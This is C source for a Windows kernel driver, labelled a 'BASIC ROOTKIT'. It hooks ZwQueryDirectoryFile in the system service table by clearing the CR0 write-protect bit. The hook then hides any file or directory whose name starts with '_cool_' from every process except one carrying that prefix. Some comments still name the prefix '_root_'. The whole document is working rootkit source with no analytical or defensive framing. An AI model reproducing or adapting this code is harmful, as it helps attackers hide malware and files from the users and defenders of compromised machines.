// BASIC ROOTKIT that hides files

#include "ntddk.h"

#define DWORD unsigned long
#define WORD unsigned short
#define BOOL unsigned long

#pragma pack(1)
typedef struct ServiceDescriptorEntry {
	unsigned int *ServiceTableBase;
	unsigned int *ServiceCounterTableBase; //Used only in checked build
	unsigned int NumberOfServices;
	unsigned char *ParamTableBase;
} ServiceDescriptorTableEntry_t, *PServiceDescriptorTableEntry_t;
#pragma pack()

__declspec(dllimport)  ServiceDescriptorTableEntry_t KeServiceDescriptorTable;
#define SYSTEMSERVICE(_function)  KeServiceDescriptorTable.ServiceTableBase[ *(PULONG)((PUCHAR)_function+1)]

// Length of process name (rounded up to next DWORD)
#define PROCNAMELEN     20
// Maximum length of NT process name
#define NT_PROCNAMELEN  16

ULONG gProcessNameOffset;

// --added
#define FileIdFullDirectoryInformation 38
#define FileIdBothDirectoryInformation 37


typedef struct _FILE_DIRECTORY_INFORMATION {
    ULONG NextEntryOffset;
    ULONG FileIndex;
    LARGE_INTEGER CreationTime;
    LARGE_INTEGER LastAccessTime;
    LARGE_INTEGER LastWriteTime;
    LARGE_INTEGER ChangeTime;
    LARGE_INTEGER EndOfFile;
    LARGE_INTEGER AllocationSize;
    ULONG FileAttributes;
    ULONG FileNameLength;
    WCHAR FileName[1];
} FILE_DIRECTORY_INFORMATION, *PFILE_DIRECTORY_INFORMATION;

typedef struct _FILE_FULL_DIR_INFORMATION {
    ULONG NextEntryOffset;
    ULONG FileIndex;
    LARGE_INTEGER CreationTime;
    LARGE_INTEGER LastAccessTime;
    LARGE_INTEGER LastWriteTime;
    LARGE_INTEGER ChangeTime;
    LARGE_INTEGER EndOfFile;
    LARGE_INTEGER AllocationSize;
    ULONG FileAttributes;
    ULONG FileNameLength;
    ULONG EaSize;
    WCHAR FileName[1];
} FILE_FULL_DIR_INFORMATION, *PFILE_FULL_DIR_INFORMATION;

typedef struct _FILE_ID_FULL_DIR_INFORMATION {
    ULONG NextEntryOffset;
    ULONG FileIndex;
    LARGE_INTEGER CreationTime;
    LARGE_INTEGER LastAccessTime;
    LARGE_INTEGER LastWriteTime;
    LARGE_INTEGER ChangeTime;
    LARGE_INTEGER EndOfFile;
    LARGE_INTEGER AllocationSize;
    ULONG FileAttributes;
    ULONG FileNameLength;
    ULONG EaSize;
    LARGE_INTEGER FileId;
    WCHAR FileName[1];
} FILE_ID_FULL_DIR_INFORMATION, *PFILE_ID_FULL_DIR_INFORMATION;

typedef struct _FILE_BOTH_DIR_INFORMATION {
    ULONG NextEntryOffset;
    ULONG FileIndex;
    LARGE_INTEGER CreationTime;
    LARGE_INTEGER LastAccessTime;
    LARGE_INTEGER LastWriteTime;
    LARGE_INTEGER ChangeTime;
    LARGE_INTEGER EndOfFile;
    LARGE_INTEGER AllocationSize;
    ULONG FileAttributes;
    ULONG FileNameLength;
    ULONG EaSize;
    CCHAR ShortNameLength;
    WCHAR ShortName[12];
    WCHAR FileName[1];
} FILE_BOTH_DIR_INFORMATION, *PFILE_BOTH_DIR_INFORMATION;

typedef struct _FILE_ID_BOTH_DIR_INFORMATION {
    ULONG NextEntryOffset;
    ULONG FileIndex;
    LARGE_INTEGER CreationTime;
    LARGE_INTEGER LastAccessTime;
    LARGE_INTEGER LastWriteTime;
    LARGE_INTEGER ChangeTime;
    LARGE_INTEGER EndOfFile;
    LARGE_INTEGER AllocationSize;
    ULONG FileAttributes;
    ULONG FileNameLength;
    ULONG EaSize;
    CCHAR ShortNameLength;
    WCHAR ShortName[12];
    LARGE_INTEGER FileId;
    WCHAR FileName[1];
} FILE_ID_BOTH_DIR_INFORMATION, *PFILE_ID_BOTH_DIR_INFORMATION;

typedef struct _FILE_NAMES_INFORMATION {
    ULONG NextEntryOffset;
    ULONG FileIndex;
    ULONG FileNameLength;
    WCHAR FileName[1];
} FILE_NAMES_INFORMATION, *PFILE_NAMES_INFORMATION;

NTSYSAPI
NTSTATUS
NTAPI
ZwQueryDirectoryFile(
        IN HANDLE hFile,
        IN HANDLE hEvent OPTIONAL,
        IN PIO_APC_ROUTINE IoApcRoutine OPTIONAL,
        IN PVOID IoApcContext OPTIONAL,
        OUT PIO_STATUS_BLOCK pIoStatusBlock,
        OUT PVOID FileInformationBuffer,
        IN ULONG FileInformationBufferLength,
        IN FILE_INFORMATION_CLASS FileInfoClass,
        IN BOOLEAN bReturnOnlyOneEntry,
        IN PUNICODE_STRING PathMask OPTIONAL,
        IN BOOLEAN bRestartQuery
);

typedef NTSTATUS (*ZWQUERYDIRECTORYFILE)(
        HANDLE hFile,
        HANDLE hEvent,
        PIO_APC_ROUTINE IoApcRoutine,
        PVOID IoApcContext,
        PIO_STATUS_BLOCK pIoStatusBlock,
        PVOID FileInformationBuffer,
        ULONG FileInformationBufferLength,
        FILE_INFORMATION_CLASS FileInfoClass,
        BOOLEAN bReturnOnlyOneEntry,
        PUNICODE_STRING PathMask,
        BOOLEAN bRestartQuery
);

ZWQUERYDIRECTORYFILE        OldZwQueryDirectoryFile;

/* Find the offset of the process name within the executive process
   block.  We do this by searching for the first occurance of "System"
   in the current process when the device driver is loaded. */

void GetProcessNameOffset()
{
  PEPROCESS curproc = PsGetCurrentProcess();
  int i;
  for( i = 0; i < 3*PAGE_SIZE; i++ ) 
  {
      if( !strncmp( "System", (PCHAR) curproc + i, strlen("System") ))
	{
	  gProcessNameOffset = i;
	}
  }
}

/* Given a directory entry, return the next
   directory entry in the linked list. */

DWORD getDirEntryLenToNext(IN PVOID FileInformationBuffer,
						   IN FILE_INFORMATION_CLASS FileInfoClass)
{
        DWORD result = 0;
        switch(FileInfoClass){
                case FileDirectoryInformation:
                        result = ((PFILE_DIRECTORY_INFORMATION)FileInformationBuffer)->NextEntryOffset;
                        break;
                case FileFullDirectoryInformation:
                        result = ((PFILE_FULL_DIR_INFORMATION)FileInformationBuffer)->NextEntryOffset;
                        break;
                case FileIdFullDirectoryInformation:
                        result = ((PFILE_ID_FULL_DIR_INFORMATION)FileInformationBuffer)->NextEntryOffset;
                        break;
                case FileBothDirectoryInformation:
                        result = ((PFILE_BOTH_DIR_INFORMATION)FileInformationBuffer)->NextEntryOffset;
                        break;
                case FileIdBothDirectoryInformation:
                        result = ((PFILE_ID_BOTH_DIR_INFORMATION)FileInformationBuffer)->NextEntryOffset;
                        break;
                case FileNamesInformation:
                        result = ((PFILE_NAMES_INFORMATION)FileInformationBuffer)->NextEntryOffset;
                        break;
        }
        return result;
}

/* Given two directory entries, link them together in a list. */

void setDirEntryLenToNext(IN PVOID FileInformationBuffer,
						  IN FILE_INFORMATION_CLASS FileInfoClass,
						  IN DWORD value)
{
        switch(FileInfoClass){
                case FileDirectoryInformation:
                        ((PFILE_DIRECTORY_INFORMATION)FileInformationBuffer)->NextEntryOffset = value;
                        break;
                case FileFullDirectoryInformation:
                        ((PFILE_FULL_DIR_INFORMATION)FileInformationBuffer)->NextEntryOffset = value;
                        break;
                case FileIdFullDirectoryInformation:
                        ((PFILE_ID_FULL_DIR_INFORMATION)FileInformationBuffer)->NextEntryOffset = value;
                        break;
                case FileBothDirectoryInformation:
                        ((PFILE_BOTH_DIR_INFORMATION)FileInformationBuffer)->NextEntryOffset = value;
                        break;
                case FileIdBothDirectoryInformation:
                        ((PFILE_ID_BOTH_DIR_INFORMATION)FileInformationBuffer)->NextEntryOffset = value;
                        break;
                case FileNamesInformation:
                        ((PFILE_NAMES_INFORMATION)FileInformationBuffer)->NextEntryOffset = value;
                        break;
        }
}
        
/* Return the filename of the specified directory entry. */

PVOID getDirEntryFileName(IN PVOID FileInformationBuffer,
						  IN FILE_INFORMATION_CLASS FileInfoClass)
{
        PVOID result = 0;
        switch(FileInfoClass){
                case FileDirectoryInformation:
                        result = (PVOID)&((PFILE_DIRECTORY_INFORMATION)FileInformationBuffer)->FileName[0];
                        break;
                case FileFullDirectoryInformation:
                        result =(PVOID)&((PFILE_FULL_DIR_INFORMATION)FileInformationBuffer)->FileName[0];
                        break;
                case FileIdFullDirectoryInformation:
                        result =(PVOID)&((PFILE_ID_FULL_DIR_INFORMATION)FileInformationBuffer)->FileName[0];
                        break;
                case FileBothDirectoryInformation:
                        result =(PVOID)&((PFILE_BOTH_DIR_INFORMATION)FileInformationBuffer)->FileName[0];
                        break;
                case FileIdBothDirectoryInformation:
                        result =(PVOID)&((PFILE_ID_BOTH_DIR_INFORMATION)FileInformationBuffer)->FileName[0];
                        break;
                case FileNamesInformation:
                        result =(PVOID)&((PFILE_NAMES_INFORMATION)FileInformationBuffer)->FileName[0];
                        break;
        }
        return result;
}

/* Return the length of the filename of the specified directory
   entry. */

ULONG getDirEntryFileLength(IN PVOID FileInformationBuffer,
							IN FILE_INFORMATION_CLASS FileInfoClass)
{
        ULONG result = 0;
        switch(FileInfoClass){
                case FileDirectoryInformation:
                        result = (ULONG)((PFILE_DIRECTORY_INFORMATION)FileInformationBuffer)->FileNameLength;
                        break;
                case FileFullDirectoryInformation:
                        result =(ULONG)((PFILE_FULL_DIR_INFORMATION)FileInformationBuffer)->FileNameLength;
                        break;
                case FileIdFullDirectoryInformation:
                        result =(ULONG)((PFILE_ID_FULL_DIR_INFORMATION)FileInformationBuffer)->FileNameLength;
                        break;
                case FileBothDirectoryInformation:
                        result =(ULONG)((PFILE_BOTH_DIR_INFORMATION)FileInformationBuffer)->FileNameLength;
                        break;
                case FileIdBothDirectoryInformation:
                        result =(ULONG)((PFILE_ID_BOTH_DIR_INFORMATION)FileInformationBuffer)->FileNameLength;
                        break;
                case FileNamesInformation:
                        result =(ULONG)((PFILE_NAMES_INFORMATION)FileInformationBuffer)->FileNameLength;
                        break;
        }
        return result;
}

/* Copy the process name into the specified buffer.  */

ULONG GetProcessName( PCHAR theName )
{
  PEPROCESS       curproc;
  char            *nameptr;
  ULONG           i;
  KIRQL           oldirql;

  if( gProcessNameOffset ) 
    {
      curproc = PsGetCurrentProcess();
      nameptr   = (PCHAR) curproc + gProcessNameOffset;
      strncpy( theName, nameptr, NT_PROCNAMELEN );
      theName[NT_PROCNAMELEN] = 0; /* NULL at end */
      return TRUE;
    } 
  return FALSE;
}

/* NT's ZwQueryDirectoryFile() returns a a linked list of directory
   entries.  The function below imitates it, except it removes from
   the list any entry who's name begins with "_root_". */

NTSTATUS NewZwQueryDirectoryFile(
        IN HANDLE hFile,
        IN HANDLE hEvent OPTIONAL,
        IN PIO_APC_ROUTINE IoApcRoutine OPTIONAL,
        IN PVOID IoApcContext OPTIONAL,
        OUT PIO_STATUS_BLOCK pIoStatusBlock,
        OUT PVOID FileInformationBuffer,
        IN ULONG FileInformationBufferLength,
        IN FILE_INFORMATION_CLASS FileInfoClass,
        IN BOOLEAN bReturnOnlyOneEntry,
        IN PUNICODE_STRING PathMask OPTIONAL,
        IN BOOLEAN bRestartQuery
)
{
        NTSTATUS rc;
        CHAR aProcessName[PROCNAMELEN];
                
        GetProcessName( aProcessName );
        DbgPrint("Rootkit: NewZwQueryDirectoryFile() from %s\n", aProcessName);

        rc=((ZWQUERYDIRECTORYFILE)(OldZwQueryDirectoryFile)) (
                        hFile,         
                        hEvent,
                        IoApcRoutine,
                        IoApcContext,
                        pIoStatusBlock,
                        FileInformationBuffer,
                        FileInformationBufferLength,
                        FileInfoClass,
                        bReturnOnlyOneEntry,
                        PathMask,
                        bRestartQuery);

        if( NT_SUCCESS( rc ) && 
                (FileInfoClass == FileDirectoryInformation ||
                 FileInfoClass == FileFullDirectoryInformation ||
                 FileInfoClass == FileIdFullDirectoryInformation ||
                 FileInfoClass == FileBothDirectoryInformation ||
                 FileInfoClass == FileIdBothDirectoryInformation ||
                 FileInfoClass == FileNamesInformation )
                ) 
        {
                if(0 == memcmp(aProcessName, "_cool_", 6))
                {
                        DbgPrint("Rootkit: detected file/directory query from _root_ process\n");
                }
                else
                {
                        PVOID p = FileInformationBuffer;
                        PVOID pLast = NULL;
                        BOOL bLastOne;
                        do 
                        {
                                bLastOne = !getDirEntryLenToNext(p,FileInfoClass);
                                
                                // compare directory-name prefix with '_root_' to decide if to hide or not.

                                if (getDirEntryFileLength(p,FileInfoClass) >= 12) {
                                        if( RtlCompareMemory( getDirEntryFileName(p,FileInfoClass), L"_cool_", 12 ) == 12 ) 
                                        {
                                                if( bLastOne ) 
                                                {
                                                        if( p == FileInformationBuffer ) rc = 0x80000006;
                                                        else setDirEntryLenToNext(pLast,FileInfoClass, 0);
                                                        break;
                                                } 
                                                else 
                                                {
                                                        int iPos = ((ULONG)p) - (ULONG)FileInformationBuffer;
                                                        int iLeft = (DWORD)FileInformationBufferLength - iPos - getDirEntryLenToNext(p,FileInfoClass);
                                                        RtlCopyMemory( p, (PVOID)( (char *)p + getDirEntryLenToNext(p,FileInfoClass) ), (DWORD)iLeft );
                                                        continue;
                                                }
                                        }
                                }
                                pLast = p;
                                p = ((char *)p + getDirEntryLenToNext(p,FileInfoClass) );
                        } while( !bLastOne );
                }
        }
        return(rc);
}


VOID OnUnload( IN PDRIVER_OBJECT DriverObject )
{
	DbgPrint("Rootkit: OnUnload called\n");

	// UNProtect memory
	__asm
	{
		push	eax
		mov		eax, CR0
		and		eax, 0FFFEFFFFh
		mov		CR0, eax
		pop		eax
	}

	// put back the old function pointer
	InterlockedExchange( (PLONG) &SYSTEMSERVICE(ZwQueryDirectoryFile), 
						 (LONG) OldZwQueryDirectoryFile);

	// REProtect memory
	__asm
	{
		push	eax
		mov		eax, CR0
		or		eax, NOT 0FFFEFFFFh
		mov		CR0, eax
		pop		eax
	}
}

NTSTATUS DriverEntry( IN PDRIVER_OBJECT theDriverObject, IN PUNICODE_STRING theRegistryPath )
{
	DbgPrint("Rootkit: WE ARE ALIVE! Start hiding files.\n");

	GetProcessNameOffset();

	theDriverObject->DriverUnload  = OnUnload; 

	// UNProtect memory
	__asm
	{
		push	eax
		mov		eax, CR0
		and		eax, 0FFFEFFFFh
		mov		CR0, eax
		pop		eax
	}

	// place the hook using InterlockedExchange (no need to disable interrupts)
	// this uses the LOCK instruction to lock the memory bus during the next instruction 
	// Example:
	// LOCK INC DWORD PTR [EDX+04] 
	// This staves off collisions on multi-processor machines, while cli/sti only disable interrupts
	// on the current processor.
	//
	OldZwQueryDirectoryFile = 
		(ZWQUERYDIRECTORYFILE) InterlockedExchange(		(PLONG) &SYSTEMSERVICE(ZwQueryDirectoryFile),
														(LONG) NewZwQueryDirectoryFile);
	
	// REProtect memory
	__asm
	{
		push	eax
		mov		eax, CR0
		or		eax, NOT 0FFFEFFFFh
		mov		CR0, eax
		pop		eax
	}

	return STATUS_SUCCESS;
}

